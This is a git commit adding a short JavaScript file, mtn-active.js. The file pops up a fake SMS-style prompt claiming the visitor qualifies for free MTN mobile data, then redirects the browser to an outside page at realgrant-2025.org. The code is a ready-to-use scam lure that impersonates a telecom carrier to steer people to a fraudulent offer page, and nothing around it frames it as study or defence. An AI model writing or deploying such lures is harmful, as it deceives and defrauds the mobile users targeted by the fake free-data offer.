8a2a53ee860b521abd5b4d61f2b9cc3d1bdb2822
Sweetblogboi <nsiboy760@gmail.com>
2025-02-13 14:08:40 +0100

    Create mtn-active.js

---
+++ mtn-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 15GB'
+password=prompt('SMS: Congratulations You are qualify for MTN 15GB Free Data, Kindly Press OK to Activate now   ','ACTIVATE 15GB');
+if (password != 'ACTIVATE 15GB') {
+location.href='https://realgrant-2025.org/mtn-15gb.html';
+}
